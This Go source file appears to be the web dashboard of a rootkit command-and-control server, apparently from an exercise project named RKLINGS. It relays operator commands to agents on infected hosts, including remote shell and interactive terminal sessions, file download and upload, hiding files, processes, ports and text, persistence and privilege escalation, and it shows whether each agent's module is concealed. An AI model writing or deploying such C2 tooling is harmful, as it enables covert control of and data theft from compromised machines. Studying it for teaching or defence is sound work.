package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool {
	host := strings.Split(r.Host, ":")[0]
	return host == "localhost" || host == "127.0.0.1"
}}

type webMessage struct {
	Type, Target, Command, Path, Label, Data string
	ExecID                                   int `json:"_execId"`
	DLID                                     int `json:"_dlId"`
	UploadID                                 int `json:"_uploadId"`
}

type agentInfo struct {
	Hostname     string              `json:"hostname"`
	Kernel       string              `json:"kernel"`
	Arch         string              `json:"arch"`
	PID          int                 `json:"pid"`
	UID          int                 `json:"uid"`
	ModuleHidden bool                `json:"module_hidden"`
	Persisted    bool                `json:"persisted"`
	Hidden       map[string][]string `json:"hidden"`
}

var dashboard = struct {
	sync.Mutex
	labels map[string]string
	events []map[string]string
}{labels: make(map[string]string)}

var commandCatalog = []map[string]string{
	{"cmd": "PING", "desc": "Check agent connectivity"},
	{"cmd": "STATUS", "desc": "Show process identity"},
	{"cmd": "SHELL <command>", "desc": "Execute a command"},
	{"cmd": "HIDE FILE <name>", "desc": "Conceal a directory entry"},
	{"cmd": "HIDE PID <pid>", "desc": "Conceal a process"},
	{"cmd": "HIDE PORT <port>", "desc": "Conceal a procfs TCP entry"},
	{"cmd": "HIDE CONTENT <text>", "desc": "Filter matching read lines"},
	{"cmd": "PERSIST", "desc": "Enable persistence"},
	{"cmd": "UNPERSIST", "desc": "Disable persistence"},
	{"cmd": "ESCALATE [pid]", "desc": "Escalate a process"},
}

func recordEvent(kind, message string) {
	dashboard.Lock()
	recordEventLocked(kind, message)
	dashboard.Unlock()
}

func recordEventLocked(kind, message string) {
	dashboard.events = append(dashboard.events, map[string]string{
		"time": time.Now().Format("15:04:05"), "type": kind, "msg": message,
	})
	if len(dashboard.events) > 200 {
		dashboard.events = dashboard.events[len(dashboard.events)-200:]
	}
}

func startWeb() {
	mux := http.NewServeMux()
	mux.HandleFunc("/ws", handleWS)
	mux.HandleFunc("/shell", handleShellWS)
	mux.HandleFunc("/wait", relayWait)
	mux.HandleFunc("/connections", relayConnections)
	mux.HandleFunc("/cmd", relayCommand)
	mux.HandleFunc("/download", relayDownload)
	mux.HandleFunc("/download-size", relayDownloadSize)
	mux.HandleFunc("/upload", relayUpload)
	mux.Handle("/", spaHandler(os.Getenv("RKLINGS_WEB_DIR")))
	addr := os.Getenv("RKLINGS_WEB_ADDR")
	if addr == "" {
		addr = "127.0.0.1:8080"
	}
	if err := http.ListenAndServe(addr, mux); err != nil {
		log.Printf("webapp: %v", err)
	}
}

func relayWait(w http.ResponseWriter, _ *http.Request) {
	if !connected() {
		http.Error(w, "waiting for agent", http.StatusServiceUnavailable)
		return
	}
	fmt.Fprintln(w, "CONNECTED")
}

func relayConnections(w http.ResponseWriter, _ *http.Request) {
	_, _, connections := agents.snapshot()
	for i := uint64(0); i < connections; i++ {
		fmt.Fprintln(w, i+1)
	}
}

func relayCommand(w http.ResponseWriter, r *http.Request) {
	reply, err := sendToAgent(strings.TrimSpace(r.URL.Query().Get("q")))
	if err != nil {
		http.Error(w, err.Error(), http.StatusServiceUnavailable)
		return
	}
	fmt.Fprintln(w, reply)
}

func relayDownload(w http.ResponseWriter, r *http.Request) {
	reply, err := sendToAgent("DOWNLOAD " + strings.TrimSpace(r.URL.Query().Get("path")))
	if err != nil || strings.HasPrefix(reply, "ERR") {
		http.Error(w, result(reply, err), http.StatusBadGateway)
		return
	}
	_, _ = io.WriteString(w, reply)
}

func relayDownloadSize(w http.ResponseWriter, r *http.Request) {
	reply, err := sendToAgent("DOWNLOAD " + strings.TrimSpace(r.URL.Query().Get("path")))
	if err != nil || strings.HasPrefix(reply, "ERR") {
		http.Error(w, result(reply, err), http.StatusBadGateway)
		return
	}
	fmt.Fprintln(w, len(reply))
}

func relayUpload(w http.ResponseWriter, r *http.Request) {
	data, err := io.ReadAll(io.LimitReader(r.Body, 16<<20))
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	reply, err := sendUploadToAgent(strings.TrimSpace(r.URL.Query().Get("path")), data)
	if err != nil || strings.HasPrefix(reply, "ERR") {
		http.Error(w, result(reply, err), http.StatusBadGateway)
		return
	}
	fmt.Fprintln(w, reply)
}

func spaHandler(root string) http.Handler {
	files := http.FileServer(http.Dir(root))
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		path := filepath.Join(root, filepath.Clean(r.URL.Path))
		if info, err := os.Stat(path); err == nil && !info.IsDir() {
			files.ServeHTTP(w, r)
			return
		}
		http.ServeFile(w, r, filepath.Join(root, "index.html"))
	})
}

func handleWS(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer ws.Close()
	ws.SetReadLimit(24 << 20)
	writeState(ws)
	for {
		var msg webMessage
		if err := ws.ReadJSON(&msg); err != nil {
			return
		}
		switch msg.Type {
		case "heartbeat", "watch":
		case "refresh":
			writeState(ws)
		case "rename":
			dashboard.Lock()
			if strings.TrimSpace(msg.Label) != "" {
				dashboard.labels[msg.Target] = strings.TrimSpace(msg.Label)
			}
			dashboard.Unlock()
			writeState(ws)
		case "command":
			reply, callErr := sendToAgentID(msg.Target, msg.Command)
			recordEvent("command", msg.Command)
			ws.WriteJSON(map[string]any{"type": "result", "target": msg.Target, "command": msg.Command, "ok": callErr == nil && !strings.HasPrefix(reply, "ERR"), "reply": result(reply, callErr)})
		case "exec":
			reply, callErr := sendToAgentID(msg.Target, "SHELL "+msg.Command)
			ws.WriteJSON(map[string]any{"type": "exec_result", "target": msg.Target, "_execId": msg.ExecID, "ok": callErr == nil, "output": result(reply, callErr)})
		case "download":
			reply, callErr := sendToAgentID(msg.Target, "DOWNLOAD "+msg.Path)
			if callErr != nil || strings.HasPrefix(reply, "ERR") {
				ws.WriteJSON(map[string]any{"type": "download_result", "_dlId": msg.DLID, "ok": false, "error": result(reply, callErr)})
			} else {
				ws.WriteJSON(map[string]any{"type": "download_progress", "_dlId": msg.DLID, "received": len(reply), "total": len(reply)})
				ws.WriteJSON(map[string]any{"type": "download_result", "_dlId": msg.DLID, "ok": true, "size": len(reply), "data": base64.StdEncoding.EncodeToString([]byte(reply))})
			}
		case "upload":
			data, decodeErr := base64.StdEncoding.DecodeString(msg.Data)
			if decodeErr != nil || len(data) > 16<<20 {
				ws.WriteJSON(map[string]any{"type": "upload_result", "_uploadId": msg.UploadID, "ok": false, "error": "invalid upload"})
				continue
			}
			reply, callErr := sendUploadToAgentID(msg.Target, msg.Path, data)
			ws.WriteJSON(map[string]any{"type": "upload_result", "_uploadId": msg.UploadID, "ok": callErr == nil && !strings.HasPrefix(reply, "ERR"), "reply": result(reply, callErr), "size": len(data)})
		}
	}
}

func handleShellWS(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer ws.Close()
	target := r.URL.Query().Get("target")
	if _, err := agents.get(target); err != nil {
		ws.WriteJSON(map[string]any{"type": "error", "msg": "target offline"})
		return
	}
	reply, err := sendToAgentID(target, "PTY START")
	if err != nil || strings.HasPrefix(reply, "ERR") {
		ws.WriteJSON(map[string]any{"type": "error", "msg": result(reply, err)})
		return
	}
	defer sendToAgentID(target, "PTY CLOSE")
	ws.WriteJSON(map[string]any{"type": "ready"})
	writePTY(ws, reply)
	type input struct {
		kind int
		data []byte
		err  error
	}
	inputs := make(chan input)
	go func() {
		for {
			kind, data, err := ws.ReadMessage()
			inputs <- input{kind: kind, data: data, err: err}
			if err != nil {
				return
			}
		}
	}()
	poll := time.NewTicker(100 * time.Millisecond)
	defer poll.Stop()
	for {
		select {
		case message := <-inputs:
			if message.err != nil {
				return
			}
			if message.kind != websocket.TextMessage && message.kind != websocket.BinaryMessage {
				continue
			}
			if message.kind == websocket.TextMessage && strings.HasPrefix(string(message.data), "{") {
				var resize struct {
					Type       string
					Cols, Rows uint16
				}
				if json.Unmarshal(message.data, &resize) == nil && resize.Type == "resize" {
					reply, err = sendToAgentID(target, fmt.Sprintf("PTY RESIZE %d %d", resize.Cols, resize.Rows))
					if err == nil {
						writePTY(ws, reply)
					}
					continue
				}
			}
			reply, err = sendToAgentID(target, "PTY INPUT "+base64.StdEncoding.EncodeToString(message.data))
		case <-poll.C:
			reply, err = sendToAgentID(target, "PTY INPUT ")
		}
		if err != nil {
			return
		}
		writePTY(ws, reply)
	}
}

func writePTY(ws *websocket.Conn, reply string) {
	encoded := strings.TrimPrefix(reply, "DATA")
	encoded = strings.TrimSpace(encoded)
	if encoded == "" {
		return
	}
	if data, err := base64.StdEncoding.DecodeString(encoded); err == nil {
		_ = ws.WriteMessage(websocket.BinaryMessage, data)
	}
}

func writeState(ws *websocket.Conn) {
	sessions, _, _ := agents.snapshot()
	dashboard.Lock()
	labels := make(map[string]string, len(dashboard.labels))
	for id, label := range dashboard.labels {
		labels[id] = label
	}
	events := append([]map[string]string(nil), dashboard.events...)
	dashboard.Unlock()
	targets := []map[string]any{}
	for _, session := range sessions {
		id, peer := session.id, session.peer
		label := labels[id]
		if label == "" {
			label = id
		}
		info := agentInfo{Hidden: map[string][]string{"file": {}, "content": {}, "pid": {}, "port": {}}}
		reply, err := sendToAgentID(id, "INFO")
		if err == nil && strings.HasPrefix(reply, "INFO ") {
			if err := json.Unmarshal([]byte(strings.TrimPrefix(reply, "INFO ")), &info); err != nil {
				recordEvent("error", "invalid INFO response")
			}
		}
		counts := make(map[string]int, len(info.Hidden))
		for kind, values := range info.Hidden {
			key := kind + "s"
			if kind == "content" {
				key = kind
			}
			counts[key] = len(values)
		}
		targets = append(targets, map[string]any{
			"id": id, "label": label, "hostname": info.Hostname, "peer": peer,
			"kernel": info.Kernel, "arch": info.Arch, "pid": info.PID, "uid": info.UID, "online": true,
			"module_hidden": info.ModuleHidden, "persisted": info.Persisted,
			"hidden": info.Hidden, "counts": counts,
			"last_seen": time.Now().Format(time.RFC3339),
		})
	}
	ws.WriteJSON(map[string]any{"type": "state", "targets": targets, "events": events, "commands": commandCatalog})
}

func connected() bool {
	_, err := agents.current()
	return err == nil
}
func result(reply string, err error) string {
	if err != nil {
		return err.Error()
	}
	return reply
}
